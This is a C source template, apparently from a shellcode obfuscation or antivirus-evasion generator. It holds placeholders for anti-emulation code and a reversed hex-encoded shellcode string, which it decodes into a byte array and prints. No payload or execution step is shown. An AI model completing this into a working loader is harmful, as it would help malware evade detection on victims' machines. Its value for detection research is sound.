#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	{{ANTI_EMULATION}}

	{{SHELLCODE}}

	// reverse the string
	char* hex_string = _strrev(reversed_hex_string);
	printf("Reversed hex string: %s\n", hex_string);

	// declare a new shellcode byte array
	char shellcode[sizeof(reversed_hex_string)] = { 0 };
	
	// define an index to keep track of where we're at
	int idx = 0;
	int count = 0;
	const int MAX_TOKENS = sizeof(reversed_hex_string);
	char* next_token = NULL;
	char* token = strtok_s(hex_string, ",", &next_token);
	while (token != NULL && count < MAX_TOKENS) {
		shellcode[count++] = strtol(token, NULL, 16);
		token = strtok_s(NULL, ",", &next_token);
	}

	idx = 0;
	while ( idx < shellcode_len)
	{
		if (idx == (shellcode_len - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}

    return 0;
	
}

